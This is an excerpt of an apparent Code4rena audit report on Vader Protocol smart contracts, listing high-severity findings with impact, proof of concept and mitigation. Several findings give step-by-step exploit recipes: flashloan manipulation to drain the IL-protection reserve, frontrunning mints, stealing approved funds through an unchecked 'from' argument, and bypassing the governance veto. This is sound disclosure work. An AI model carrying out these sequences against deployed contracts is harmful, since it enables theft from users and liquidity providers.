- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/x-vader/XVader.sol>

- <https://www.vaderprotocol.io/whitepaper>

#### Tools Used

Manually code review

#### Recommended Mitigation Steps

There should be pre and post checks on balances to get the real amount"
52.md,TwapOracle doesn't calculate VADER:USDV exchange rate correctly,high,"#### Impact

Detailed description of the impact of this finding.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/twap/TwapOracle.sol#L156>

On L156 of `TwapOracle` we perform the calculation:

    result = ((sumUSD * IERC20Metadata(token).decimals()) / sumNative);

This seems extremely odd as for an 18 decimal token we're then calculating

    result = ((sumUSD * 18) / sumNative);

This is just plain weird. I expect what was meant is to replace this line with the below so we're properly scaling for `token`'s number of decimals.

    uint256 scalingFactor = 10 ** IERC20Metadata(token).decimals()
    result = (sumUSD * scalingFactor) / sumNative;

Marked as high severity as this exchange rate appears to be used in [some form of minting mechanism](https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/tokens/Vader.sol#L18-L19) and correctness of the oracle is listed as one of the key focuses of the audit.

#### Recommended Mitigation Steps

As above.


> The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit."
52.md,LPs of VaderPoolV2 can manipulate pool reserves to extract funds from the reserve.,high,"#### Impact

Impermanent loss protection can be exploited to drain the reserve.

#### Proof of Concept

In `VaderPoolV2.burn` we calculate the current losses that the LP has made to impermanent loss.

<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex-v2/pool/VaderPoolV2.sol#L237-L269>

These losses are then refunded to the LP in VADER tokens from the reserve

<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex-v2/router/VaderRouterV2.sol#L208-L227>

This loss is calculated by the current reserves of the pool so if an LP can manipulate the pool's reserves they can artificially engineer a huge amount of IL in order to qualify for a payout up to the size of their LP position.

<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex/math/VaderMath.sol#L73-L93>

The attack is then as follows.

1.  Be an LP for a reasonable period of time (IL protection scales linearly up to 100% after a year)
2.  Flashloan a huge amount of one of the pool's assets.
3.  Trade against the pool with the flashloaned funds to unbalance it such that your LP position has huge IL.
4.  Remove your liquidity and receive compensation from the reserve for the IL you have engineered.
5.  Re-add your liquidity back to the pool.
6.  Trade against the pool to bring it back into balance.

The attacker now holds the majority of their flashloaned funds (minus slippage/swap fees) along with a large fraction of the value of their LP position in VADER paid out from the reserve. The value of their LP position is unchanged. Given a large enough LP position, the IL protection funds extracted from the reserve will exceed the funds lost to swap fees and the attacker will be able to repay their flashloan with a profit.

This is a high risk issue as after a year any large LP is incentivised and able to perform this attack.

#### Recommended Mitigation Steps

Use a manipulation resistant oracle for the relative prices of the pool's assets (TWAP, etc.)"
52.md,Paying IL protection for all VaderPool pairs allows the reserve to be drained.,high,"#### Impact

Vader Reserve can be drained of funds.

#### Proof of Concept

In `VaderPoolV2.burn` we calculate the current losses that the LP has made to impermanent loss.

<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex/pool/VaderPool.sol#L77-L89>

These losses are then refunded to the LP in VADER tokens from the reserve. NOTE: This IL protection is paid for ALL token pairs. THIS IS IMPORTANT!

<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex/router/VaderRouter.sol#L187-L206>

The loss is calculated by the comparing the amounts of each asset initially added to the pool against the amounts of each asset which are removed from the pool. There's an unspoken assumption here that the LP entered the pool at the true price at that point.

<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex/math/VaderMath.sol#L73-L93>

Crucially we see that if an attacker can cheaply create a pool with a token which starts off with a very low price in terms of VADER and is guaranteed to have a very high price in terms of VADER then they will benefit from a large amount of IL protection funds from the reserve.

An attacker could then perform this attack with the following.

1.  Flashloan a huge amount of Vader (or flashloan + buy VADER).
2.  Deploy a token TKN, which the attacker can mint as much as they like.
3.  Add liquidity to a new pool with a large amount of VADER and a small amount of TKN
4.  Use their ability to mint TKN to buy up all the VADER in their pool
5.  Repay flashloan with VADER extracted from pool + some pre-existing funds as attacker needs to cover VADER lost to swap fees/slippage.

The attacker has now engineered a liquidity position which looks massively underwater due to IL but in reality was very cheap to produce. Nobody else can do anything to this pool except just give the attacker money by buying TKN so this attack can't be prevented. The attacker now just needs to wait for at most a year for the IL protection to tick up and then they can cash in the LP position for a nice payday of up to the amount of VADER they initially added to the pool.

#### Recommended Mitigation Steps

Add a whitelist to the pairs which qualify for IL protection."
52.md,"VaderReserve does not support paying IL protection out to more than one address, resulting in locked funds",high,"#### Impact

All liquidity deployed to one of `VaderPool` or `VaderPoolV2` will be locked permanently.

#### Proof of Concept

Both `VaderRouter` and `VaderRouterV2` make calls to `VaderReserve` in order to pay out IL protection.

- <https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex/router/VaderRouter.sol#L206>

- <https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex-v2/router/VaderRouterV2.sol#L227>

However `VaderReserve` only allows a single router to claim IL protection on behalf of users.

<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/reserve/VaderReserve.sol#L80-L83>

It's unlikely that the intent is to deploy multiple reserves so there's no way for both `VaderRouter` and `VaderRouterV2` to pay out IL protection simultaneously.

This is a high severity issue as any LPs which are using the router which is not listed on `VaderReserve` will be unable to remove liquidity as the call to the reserve will revert. Vader governance is unable to update the allowed router on `VaderReserve` so all liquidity on either `VaderPool` or `VaderPoolV2` will be locked permanently.

#### Recommended Mitigation Steps

Options:

1.  Allow the reserve to whitelist multiple addresses to claim funds
2.  Allow the call to the reserve to fail without reverting the entire transaction (probably want to make this optional for LPs)"
52.md,USDV and VADER rate can be wrong,high,"#### Impact

<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L166>

`tUSDInUSDV` can be smaller than `tUSDInVader`, and then `getRate` will return 0.
This will lead wrong rate calculation.

#### Tools Used

Manually

#### Recommended Mitigation Steps

Multiple enough decimals before division


>The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit."
52.md,VaderPoolV2 incorrectly calculates the amount of IL protection to send to LPs,high,"#### Impact

The `VaderReserve` pays out IL from `VaderPoolV2` LPs expressed in USDV with VADER (assuming a 1:1 exchange rate)

#### Proof of Concept

From the TwapOracle, it can be seen that `VaderPoolV2` is intended to be deployed with USDV as its `nativeAsset`:

- <https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/twap/TwapOracle.sol#L281-L296>

- <https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex-v2/pool/BasePoolV2.sol#L58-L59>

All the pairs in `VaderPoolV2` are then USDV:TKN where TKN is some other token, exactly which is irrelevant in this case.

`VaderPoolV2` offers IL protection where any IL is refunded from the `VaderReserve`

<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex-v2/pool/VaderPoolV2.sol#L258-L268>

The `VaderReserve` holds a balance of VADER tokens which will be used to pay out this protection.

<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/reserve/VaderReserve.sol#L76-L90>

The IL experienced by the LP is calculated in `VaderMath.calculateLoss`

<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex/math/VaderMath.sol#L73-L93>

This is the core of the issue. From the variable names it's clear that this is written with the assumption that it is work on units of VADER whereas it is provided amounts in terms of USDV. Checking `VaderRouterV2` we can see that we pass the output of this calculation directly to the reserve in order to claim VADER.

If an LP experienced 100 USDV worth of IL, instead of claiming the equivalent amount of VADER they would receive exactly 100 VADER as there's no handling of the exchange rate between USDV and VADER.

As VADER and USDV are very unlikely to trade at parity LPs could get sustantially more or less than the amount of IL they experienced.

#### Recommended Mitigation Steps

Add handling for the conversion rate between VADER and USDV using a tamper resistant oracle (TwapOracle could potentially fulfil this role)."
52.md,calculate Loss is vulnerable to flashloan attack,high,"#### Impact

The VaderPool would compensate users' IL. The formula it uses to calculate lp value is vulnerable to manipulation.

The formula to calculate the lp value is similar to warp finance which is known to be unsafe. [warpfinance-incident-root-cause-analysis](https://peckshield.medium.com/warpfinance-incident-root-cause-analysis-581a4869ee00) (Please to refer to the POC section)

The Attacker can purchase an old lp position, manipulate price, take IL compensation and drain the reserve.
I consider this is a high-risk issue.

#### Proof of Concept

[VaderMath.sol#L69-L93](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/math/VaderMath.sol#L69-L93)

The lp value is calculated as `[(A0 * P1) + V0]` and `// [(A1 * P1) + V1]`.
Assume that there's an ETH pool and there's 100 ETH and 100 Vader in the pool.

1.  Attacker deposit 1 ETH and 1 Vader and own 1% of the liquidity.
2.  Wait 1 year
3.  Start flash loan and buy a lot ETH with 99900 Vader.
4.  There's  0.1 ETH 100,000 Vader in the pool.
5.  Burn 1 % lp at the price 1 ETH = 1,000,000 Vader.
6.  A0 \* P1 + V0 = 1 (eth) \* 1,000,000 (price) + 100 (vader)
7.  A1 \* P1 + V1 = 0.001 (eth) \* 1,000,000 (price) + 10,000 (vader)
8.  IL compensation would be around `9891000`.

#### Tools Used

None

#### Recommended Mitigation Steps

Please use the fair lp pricing formula from alpha finance instead. [fair-lp-token-pricing](https://blog.alphafinance.io/fair-lp-token-pricing/)"
52.md,(dex-v1) BasePool.mint() function can be frontrun,high,"#### Impact

In the contract BasePool the mint function can be frontrun. This will assign the NFT to the attacker which later on he can burn it retrieving the corresponding `\_nativeAsset` and `\_foreignAsset` initially deposited by the frontrun victim.
<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/pool/BasePool.sol#L149-L194>

#### Proof of Concept

User1 transfers 1000 `\_nativeAsset` tokens and 1000 `\_foreignAsset` tokens into the BasePool contract.
User1 calls the `BasePool.mint()` function to retrieve his NFT.
Attacker is constantly polling for an increase of the balance of `\_nativeAsset` and `\_foreignAsset` of the contract OR attacker is constantly scanning the mempool for `mint()` function calls.
Attacker detects an increase of balance of `\_nativeAsset` and `\_foreignAsset` OR attacker detects a `mint()` function call in the mempool.
Attacker frontruns the mint call and retrieves the NFT. Gets a NFT that is worth 1000 `\_nativeAssets` and 1000 `\_foreignAssets`.
User1 gets a NFT that is worth 0 `\_nativeAssets` and 0 `\_foreignAssets`.
Attacker burns the NFT retrieving the corresponding `\_nativeAsset` and `\_foreignAsset` initially deposited by the victim.

#### Tools Used

Manual testing

#### Recommended Mitigation Steps

Include in the `mint()` function the transfer of `\_nativeAssets` and `\_foreignAssets` to the smart contract."
52.md,Attacker can get extremely cheap synth by front-running create Pool,high,"#### Impact

`createPool` is a permissionless transaction.

1.  Anyone can create a token pool.
2.  Token price is set by the first lp provider.
3.  User can get a synthetic asset.

Assume a new popular `coin` that the DAO decides to add to the protocol.
The attacker can create the pool and set it to be extremely cheap. (By depositing 1 wei `coin` and 10^18 wei Vader.) The attacker can mint a lot of synth by providing another 10^18 wei Vader.

There's no way to revoke the pool. The `coin` pool would be invalid since the attacker can drain all the lp in the pool.

I consider this is a high-risk issue.

#### Proof of Concept

- [VaderPoolFactory.sol#L43-L89](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/pool/VaderPoolFactory.sol#L43-L89)
- [VaderPoolV2.sol#L115-L167](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L115-L167)

#### Tools Used

None

#### Recommended Mitigation Steps

Restrict users from minting synth from a new and illiquid pool.
Some thoughts about the fix:

1.  Decide minimum liquidity for a synthetic asset (e.g 1M Vader in the pool)
2.  Once there's enough liquidity pool, anyone can deploy a synthetic asset after a cool down. (e.g. 3 days

The pool can remain permissionless and safe."
52.md,Anyone Can Arbitrarily Mint Synthetic Assets In `VaderPoolV2.mintSynth()`,high,"#### Impact

The `mintSynth()` function is callable by any user and creates a synthetic asset against `foreignAsset` if it does not already exist. The protocol expects a user to first approve the contract as a spender before calling `mintSynth()`. However, any arbitrary user could monitor the blockchain for contract approvals that match `VaderPoolV2.sol` and effectively frontrun their call to `mintSynth()` by setting the `to` argument to their own address. As a result, the `nativeDeposit` amount is transferred from the victim, and a synthetic asset is minted and finally transferred to the malicious user who is represented by the `to` address.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L167>

#### Tools Used

Manual code review.
Discussions with dev.

#### Recommended Mitigation Steps

Consider removing the `from` argument in `mintSynth()` and update the `safeTransferFrom()` call to instead transfer from `msg.sender`."
52.md,Anyone Can Arbitrarily Mint Fungible Tokens In `VaderPoolV2.mintFungible()`,high,"#### Impact

The `mintFungible()` function is callable by any user that wishes to mint liquidity pool fungible tokens. The protocol expects a user to first approve the contract as a spender before calling `mintFungible()`. However, any arbitrary user could monitor the blockchain for contract approvals that match `VaderPoolV2.sol` and effectively frontrun their call to `mintFungible()` by setting the `to` argument to their own address. As a result, the `nativeDeposit` and `foreignDeposit` amounts are transferred from the victim, and LP tokens are minted and finally transferred to the malicious user who is represented by the `to` address.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L335>

#### Tools Used

Manual code review.
Discussions with dev.

#### Recommended Mitigation Steps

Consider removing the `from` argument in `mintFungible()` and update the `safeTransferFrom()` calls to instead transfer from `msg.sender`."
52.md,`VaderRouter._swap` performs wrong swap,high,"The 3-path hop in `VaderRouter._swap` is supposed to first swap **foreign** assets to native assets, and then the received native assets to different foreign assets again.

The `pool.swap(nativeAmountIn, foreignAmountIn)` accepts the foreign amount as the **second** argument.
The code however mixes these positional arguments up and tries to perform a `pool0` foreign -> native swap by using the **foreign** amount as the **native amount**:

```solidity
function _swap(
    uint256 amountIn,
    address[] calldata path,
    address to
) private returns (uint256 amountOut) {
    if (path.length == 3) {
      // ...
      // @audit calls this with nativeAmountIn = amountIn. but should be foreignAmountIn (second arg)
      return pool1.swap(0, pool0.swap(amountIn, 0, address(pool1)), to);
    }
}

// @audit should be this instead
return pool1.swap(pool0.swap(0, amountIn, address(pool1)), 0, to);
```

#### Impact

All 3-path swaps through the `VaderRouter` fail in the pool check when `require(nativeAmountIn = amountIn <= nativeBalance - nativeReserve = 0)` is checked, as foreign amount is sent but *native* amount is specified.

#### Recommended Mitigation Steps

Use `return pool1.swap(pool0.swap(0, amountIn, address(pool1)), 0, to);` instead."
52.md,`VaderRouter.calculateOutGivenIn` calculates wrong swap,high,"The 3-path hop in `VaderRouter.calculateOutGivenIn` is supposed to first swap **foreign** assets to native assets **in pool0**, and then the received native assets to different foreign assets again **in pool1**.

The first argument of `VaderMath.calculateSwap(amountIn, reserveIn, reserveOut)` must refer to the same token as the second argument `reserveIn`.
The code however mixes these positions up and first performs a swap in `pool1` instead of `pool0`:

```solidity
function calculateOutGivenIn(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256 amountOut)
{
  if(...) {
  } else {
    return
        VaderMath.calculateSwap(
            VaderMath.calculateSwap(
                // @audit the inner trade should not be in pool1 for a forward swap. amountIn foreign => next param should be foreignReserve0
                amountIn,
                nativeReserve1,
                foreignReserve1
            ),
            foreignReserve0,
            nativeReserve0
        );
  }

 /** @audit instead should first be trading in pool0!
    VaderMath.calculateSwap(
        VaderMath.calculateSwap(
            amountIn,
            foreignReserve0,
            nativeReserve0
        ),
        nativeReserve1,
        foreignReserve1
    );
  */
```

#### Impact

All 3-path swaps computations through `VaderRouter.calculateOutGivenIn` will return the wrong result.
Smart contracts or off-chain scripts/frontends that rely on this value to trade will have their transaction reverted, or in the worst case lose funds.

#### Recommended Mitigation Steps

Return the following code instead which first trades in `pool0` and then in `pool1`:

```solidity
return
  VaderMath.calculateSwap(
      VaderMath.calculateSwap(
          amountIn,
          foreignReserve0,
          nativeReserve0
      ),
      nativeReserve1,
      foreignReserve1
  );
```"
52.md,TWAPOracle might register with wrong token order,high,"The `TWAPOracle.registerPair` function takes in a `factory` and (`token0, token1)`.
The function accepts a `_factory` argument which means any Uniswap-like factory can be used.

When using the actual Uniswap factory's `IUniswapV2Factory(factory).getPair(token0, token1)` call, it could be that the `token0` and `token1` are reversed as it [ignores the order](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Factory.sol#L35).

Meaning, the `price0/1CumulativeLast` could also be reversed as it matches the internal order.
The code however pushes the `_pairs` assuming that the internal `price0CumulativeLast, price1CumulativeLast` order matches the order of the function arguments `token0, token1`.

```solidity
_pairs.push(
    PairData({
        pair: pairAddr,
        token0: token0,
        token1: token1,
        price0CumulativeLast: price0CumulativeLast,
        price1CumulativeLast: price1CumulativeLast,
        blockTimestampLast: blockTimestampLast,
        price0Average: FixedPoint.uq112x112({_x: 0}),
        price1Average: FixedPoint.uq112x112({_x: 0})
    })
);
```

#### Impact

The prices could be inverted which leads to the oracle providing wrong prices.

#### Recommended Mitigation Steps

It should be checked if Uniswap's internal order matches the order of the `token0/1` function arguments.
If not, the cumulative prices must be swapped.

```solidity
// pseudocode
IUniswapV2Pair pair = IUniswapV2Pair(
    IUniswapV2Factory(factory).getPair(token0, token1)
);
pairAddr = address(pair);
price0CumulativeLast = pair.price0CumulativeLast();
price1CumulativeLast = pair.price1CumulativeLast();
(price0CumulativeLast, price1CumulativeLast) = token0 == pair.token0() ? (price0CumulativeLast, price1CumulativeLast) : (price1CumulativeLast, price0CumulativeLast);
```

> The same issue exists in `update`


> The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit."
52.md,Attacker can claim more IL by manipulating pool price then `removeLiquidity`,high,"#### Impact

Vader reimburse user IL immediately when user withdraw from the pool (VaderRouterV2.sol:L227), an attacker can therefore manipulate the pool balance causing a high IL, remove liquidity and restore the pool balance such that he will receive a larger IL reimbursement.

#### Proof of Concept

Let's assume our attacker own 100% of FOO-VADER

1.  Attacker add 100 FOO and 100 VADER to the Pool
2.  wait some block, or 1 year for max IL protection
3.  In 1 transaction, attacker
    *   Swap 9900 FOO to 99 Vader
    *   Pool now have 10000 FOO and 1 VADER
    *   By VaderMath.sol:L84 the loss is 100\*1/10000+100-2 = 98.01 VADER
    *   Remove liquidity and receive 10000 FOO and 99.01 VADER
    *   Restore the pool balance
4.  Such that the attacker will gain 98.01 VADER without risk

The profit is constrained by gas cost, pool fee, % of pool controlled by the attacker and % of IL protection.

#### Recommended Mitigation Steps

Use twap price to determine P1 in VaderMath.sol:L84 when calculating IL to reduce risk of manipulation"
52.md,Governance veto can be bypassed,high,"#### Impact

Since `veto` ensure none of the actions in proposal being vetoed point to the contract (GovernorAlpha.sol:L562), a malicious proposal can be designed to have an action that point to governance and therefore effectively cannot be vetoed.

#### Proof of Concept

For any attacker who want to launch a governance attack using a malicious proposal, they simply need to add an action that point to governance that does nothing (or anything).

#### Recommended Mitigation Steps

Some other design can be proposal are vetoable whenever the differential is less than x%, even if it involves governance change, s.t. council can veto most malicious proposal while it is still possible to change council given high enough vote differential."
52.md,Early user can break `addLiquidity`,high,"<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex/pool/BasePool.sol#L161-L163>

```solidity
uint256 totalLiquidityUnits = totalSupply;
if (totalLiquidityUnits == 0)
    liquidity = nativeDeposit; // TODO: Contact ThorChain on proper approach
```

In the current implementation, the first `liquidity` takes the `nativeDeposit` amount and uses it directly.

However, since this number (`totalLiquidityUnits`) will later be used for computing the `liquidity` issued for future `addLiquidity` using `calculateLiquidityUnits`.

A malicious user can add liquidity with only `1 wei` USDV and making it nearly impossible for future users to add liquidity to the pool.

##### Recommendation

Uni v2 solved this problem by sending the first 1000 tokens to the zero address.

The same should work here, i.e., on first mint (totalLiquidityUnits == 0), lock some of the first minter's tokens by minting \~1% of the initial amount to the zero address instead of to the first minter."
52.md,Lack of access control allow attacker to `mintFungible()` and `mintSynth()` with other user's wallet balance,high,"<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L335>

```solidity
function mintFungible(
        IERC20 foreignAsset,
        uint256 nativeDeposit,
        uint256 foreignDeposit,
        address from,
        address to
    ) external override nonReentrant returns (uint256 liquidity) {
        IERC20Extended lp = wrapper.tokens(foreignAsset);

        require(
            lp != IERC20Extended(_ZERO_ADDRESS),
            ""VaderPoolV2::mintFungible: Unsupported Token""
        );

        (uint112 reserveNative, uint112 reserveForeign, ) = getReserves(
            foreignAsset
        ); // gas savings

        nativeAsset.safeTransferFrom(from, address(this), nativeDeposit);
        foreignAsset.safeTransferFrom(from, address(this), foreignDeposit);

        PairInfo storage pair = pairInfo[foreignAsset];
        uint256 totalLiquidityUnits = pair.totalSupply;
        if (totalLiquidityUnits == 0) liquidity = nativeDeposit;
        else
            liquidity = VaderMath.calculateLiquidityUnits(
                nativeDeposit,
                reserveNative,
                foreignDeposit,
                reserveForeign,
                totalLiquidityUnits
            );

        require(
            liquidity > 0,
            ""VaderPoolV2::mintFungible: Insufficient Liquidity Provided""
        );

        pair.totalSupply = totalLiquidityUnits + liquidity;

        _update(
            foreignAsset,
            reserveNative + nativeDeposit,
            reserveForeign + foreignDeposit,
            reserveNative,
            reserveForeign
        );

        lp.mint(to, liquidity);

        emit Mint(from, to, nativeDeposit, foreignDeposit);
    }
```

<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L167>

Funds are transferred from the `from` parameter, and the output tokens are transferred to the `to` parameter, both passed by the caller without proper access control.

##### Impact

This issue allows anyone to call `mintFungible()` and `mintSynth()` and steal almost all their wallet balances for all the users who have approved the contract before."
52.md,`mintSynth()` and `burnSynth()` can be front run,high,"- <https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L155>

- <https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L179-L197>

Given that `mintSynth()` and `burnSynth()` will issue and redeem assets based on the price of the pool (reserves), and they will create price impact based on the volume being minted and burnt.

However, the current implementation provides no parameter for slippage control, making them vulnerable to front-run attacks. Especially for transactions with rather large volumes.

##### Recommendation

Consider adding a `minAmountOut` parameter."
52.md,`Synth` tokens can get over-minted,high,"Per the document:

> It also is capable of using liquidity units as collateral for synthetic assets, of which it will always have guaranteed redemption liquidity for.

However, in the current implementation, `Synth` tokens are minted based on the calculation result. While `nativeDeposit` be added to the reserve, `reserveForeign` will remain unchanged, not deducted nor locked.

Making it possible for `Synth` tokens to get over-minted.

##### Proof of Concept

*   The Vader pool for BTC-USDV is newly created, with nearly 0 liquidity.

1.  Alice add liquidity with `100,000 USDV` and `1 BTC`;
2.  Bob `mintSynth()` with `100,000 USDV`, got `0.25 BTC vSynth`;
3.  Alice remove all the liquidity received at step 1, got all the `200k USDV` and `1 BTC`.

The `0.25 BTC vSynth` held by Bob is now backed by nothing and unable to be redeemed.

This also makes it possible for a sophisticated attacker to steal funds from the Vader pool.

The attacker may do the following in one transaction:

1.  Add liquidity with `10 USDV` and `10,000 BTC` (flash loan);
2.  Call `mintSynth()` with `10 USDV`, repeat for 10 times, got `1461 BTC vSynth`;
3.  Remove liquidity and repay flash loan, keep the `1461 BTC vSynth`;
4.  Wait for other users to add liquidity and when the BTC reserve is sufficient, call `burnSynth()` to steal `USDV` from the pool.


> Given that the codebase attempts to implement the Thorchain rust code in a one-to-one fashion, findings that relate to the mathematical accuracy of the codebase will only be accepted in one of the following cases:
> - The code deviates from the Thorchain implementation
> - A test case is created that illustrates the problem

>While intuition is a valid ground for novel implementations, we have re-implemented a battle-tested implementation in another language and as such it is considered secure by design unless proven otherwise."
52.md,Wrong design/implementation of `addLiquidity()` allows attacker to steal funds from the liquidity pool,high,"The current design/implementation of Vader pool allows users to `addLiquidity` using arbitrary amounts instead of a fixed ratio of amounts in comparison to Uni v2.

We believe this design is flawed and it essentially allows anyone to manipulate the price of the pool easily and create an arbitrage opportunity at the cost of all other liquidity providers.

An attacker can exploit this by adding liquidity in extreme amounts and drain the funds from the pool.

<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L335>

```solidity
function mintFungible(
    IERC20 foreignAsset,
    uint256 nativeDeposit,
    uint256 foreignDeposit,
    address from,
    address to
) external override nonReentrant returns (uint256 liquidity) {
    IERC20Extended lp = wrapper.tokens(foreignAsset);

    require(
        lp != IERC20Extended(_ZERO_ADDRESS),
        ""VaderPoolV2::mintFungible: Unsupported Token""
    );

    (uint112 reserveNative, uint112 reserveForeign, ) = getReserves(
        foreignAsset
    ); // gas savings

    nativeAsset.safeTransferFrom(from, address(this), nativeDeposit);
    foreignAsset.safeTransferFrom(from, address(this), foreignDeposit);

    PairInfo storage pair = pairInfo[foreignAsset];
    uint256 totalLiquidityUnits = pair.totalSupply;
    if (totalLiquidityUnits == 0) liquidity = nativeDeposit;
    else
        liquidity = VaderMath.calculateLiquidityUnits(
            nativeDeposit,
            reserveNative,
            foreignDeposit,
            reserveForeign,
            totalLiquidityUnits
        );

    require(
        liquidity > 0,
        ""VaderPoolV2::mintFungible: Insufficient Liquidity Provided""
    );

    pair.totalSupply = totalLiquidityUnits + liquidity;

    _update(
        foreignAsset,
        reserveNative + nativeDeposit,
        reserveForeign + foreignDeposit,
        reserveNative,
        reserveForeign
    );

    lp.mint(to, liquidity);

    emit Mint(from, to, nativeDeposit, foreignDeposit);
}
```

##### Proof of Concept

Given:

*   A Vader pool with `100,000 USDV` and `1 BTC`;
*   The `totalPoolUnits` is `100`.

The attacker can do the following in one transaction:

1.  Add liquidity with `100,000 USDV` and 0 BTC, get `50 liquidityUnits`, representing 1/3 shares of the pool;
2.  Swap `0.1 BTC` to USDV, repeat for 5 times; spent`0.5 BTC` and got `62163.36 USDV`;
3.  Remove liquidity, get back `45945.54 USDV` and `0.5 BTC`; profit for: 62163.36 + 45945.54 - 100000 = 8108.9 USDV."
52.md,Wrong design of `swap()` results in unexpected and unfavorable outputs,high,"The current formula to calculate the `amountOut` for a swap is:

<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex/math/VaderMath.sol#L99-L111>

```solidity
function calculateSwap(
    uint256 amountIn,
    uint256 reserveIn,
    uint256 reserveOut
) public pure returns (uint256 amountOut) {
    // x * Y * X
    uint256 numerator = amountIn * reserveIn * reserveOut;

    // (x + X) ^ 2
    uint256 denominator = pow(amountIn + reserveIn);

    amountOut = numerator / denominator;
}
```

We believe the design (the formula) is wrong and it will result in unexpected and unfavorable outputs.

Specifically, if the `amountIn` is larger than the `reserveIn`, the `amountOut` starts to decrease.

##### Proof of Concept

Given:

*   A USDV-BTC Vader pool with the reserves of `200,000 USDV` and `2 BTC`.

1.  If Alice swap `2 BTC` for USDV, will get `50000 USDV` as output;
2.  If Bob swap `2.1 BTC` for USDV, will only get `49970.25 USDV` as output;
3.  If Carol swap `2.2 BTC` for USDV, will only get `49886.62 USDV` as output.

For the same pool reserves, paying more for less output token is unexpected and unfavorable."
52.md,All user assets which are approved to VaderPoolV2 may be stolen,high,"#### Impact

Total loss of funds which have been approved on `VaderPoolV2`

#### Proof of Concept

`VaderPoolV2` allows minting of fungible LP tokens with the `mintFungible` function

<https://github.com/code-423n4/2021-11-vader/blob/607d2b9e253d59c782e921bfc2951184d3f65825/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L290>

Crucially this function allows a user supplied value for `from` which specifies where the `nativeAsset` and `foreignAsset` should be pulled from. An attacker can then provide any address which has a token approval onto `VaderPoolV2` and mint themselves LP tokens - stealing the underlying tokens.

#### Recommended Mitigation Steps

Remove `from` argument and use msg.sender instead."
52.md,Unrestricted vestFor,high,"#### Impact

Anyone can call function `vestFor` and block any user with a tiny amount of Vader. This function has no auth checks so a malicious actor can front-run legit `vestFor` calls with insignificant amounts. This function locks the user for 365 days and does not allow updating the value, thus forbids legit conversions.

#### Recommended Mitigation Steps

Consider introducing a whitelist of callers that can vest on behalf of others (e.g. Converter)."
52.md,Incorrect Price Consultation Results,high,"#### Impact

The `TwapOracle.consult()` function iterates over all token pairs which belong to either `VADER` or USDV\` and then calculates the price of the respective asset by using both UniswapV2 and Chainlink price data. This helps to further protect against price manipulation attacks as the price is averaged out over the various registered token pairs.

Let's say we wanted to query the price of `USDV`, we would sum up any token pair where `USDV == pairData.token0`.

The sum consists of the following:

*   Price of `USDV` denominated in terms of `token1` (`USDV/token1`).
*   Price of token1 denominated in terms of `USD` (`token1/USD`).

Consider the following example:

*   `SUSHI` is the only registered token pair that exists alongside `USDV`.
*   Hence, calculating `sumNative` gives us an exchange rate that is denominated as `USDV/SUSHI`.
*   Similarly, `sumUSD` gives us the following denominated pair, `SUSHI/USD`.
*   I'd expect the result to equal `sumUSD * token.decimals() * sumNative` which should give us a USDV/USD denominated result.

